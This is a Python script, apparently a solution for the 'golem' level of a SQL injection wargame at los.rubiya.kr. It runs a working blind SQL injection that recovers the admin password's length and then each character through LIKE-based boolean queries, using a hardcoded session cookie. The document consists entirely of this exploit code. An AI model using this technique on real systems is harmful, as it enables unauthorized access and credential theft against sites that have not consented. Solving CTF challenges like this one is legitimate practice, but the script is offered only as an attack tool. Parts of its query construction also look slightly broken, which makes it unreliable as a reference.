import requests
import urllib

url="http://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
session = dict(PHPSESSID="oq28ofq8rpnsplo6ebu3em7p84")

pw=""
length=0

print("[*] START")
print("[*] find password's length")

for i in range(0,30):
	try:
		query=url+"1'||id LIKE 'admin' %26%26 length(pw) LIKE "+str(i)+"%23"
		r=requests.post(query,cookies=session)
	except:
		print("[*] exception")
		continue

	if "Hello admin" in r.text:
		length=i
		break

print("[*] password length : ",length)

print("[*] find password")

for j in range(0,length+1):
	for i in range(48,128):
		try:
			query=url+"1'||id LIKE 'admin' %26%26 MID(pw,"+str(j)+",1) LIKE '"+chr(i)
			r=requests.post(query,cookies=session)
		except:
			print("[*] exception")
			continue

		if "Hello admin" in r.text:
			pw+=chr(i)
			print("[*] find: ",pw)
			break

print("[*] password : ",pw)
